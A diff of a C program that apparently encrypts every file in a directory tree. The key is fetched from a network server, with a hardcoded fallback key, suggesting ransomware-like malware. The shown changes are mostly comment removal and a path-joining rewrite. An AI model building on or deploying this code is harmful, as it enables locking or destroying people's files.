@@ -13,7 +13,6 @@ int ID = 0;
 
 FILE* openFile(const char* path, const char* mode){
 	FILE* fp = fopen(path,mode);
-	// if error when opening one of the two file then exit
 	if (fp == NULL){
 		perror("file : ");
 		return 0;
@@ -77,7 +76,6 @@ char* getKey(int tmp_ID){
 	}
 	char* key = net_get(&ID);
 	if(!key) {
-		//printf("unable to get the key online...\n");
 		key = malloc(LENGTH);
 		snprintf(key, LENGTH,"q}}c),apx?ic*n}zy{,uv)),$pfhjx:");
 	}
@@ -112,23 +110,16 @@ int processFile(char* path, const char* key){
 	return 0;
 }
 
-/////////////////////////////////::
-
 char* addPath(const char *path, const char *file){
 	int lenPath = strlen(path);
 	int lenFile = strlen(file);
-	char *full = malloc(lenPath + lenFile + 2); // +2 for the null-terminator, /
+	char *full = malloc(lenPath + lenFile + 2); // + '/' and NULL
 	if (path == NULL){
 		perror("");
 		return "";
 	}
-	memcpy(full, path, lenPath);
-	if(strcmp("/",path)==0){
-		memcpy(full + lenPath, file, lenFile + 1); // +1 to copy the null-terminator
-	}else{
-		memcpy(full + lenPath, "/",1);
-		memcpy(full + lenPath + 1, file, lenFile + 1); // +1 to copy the null-terminator
-	}
+	sprintf(full, "%s/%s", path, file);
+	printf("-> %s\n", full);
 	return full;
 }
 
@@ -166,7 +157,6 @@ int encDir(char* path, const char* key){
 		perror(path);
 		return 1;
 	}
-	//seekdir(dir, 2);
 	struct dirent *file;
 	while((file = readdir(dir))!= NULL){
 		if(strcmp(file->d_name,".")!=0 && strcmp(file->d_name,"..")!=0){
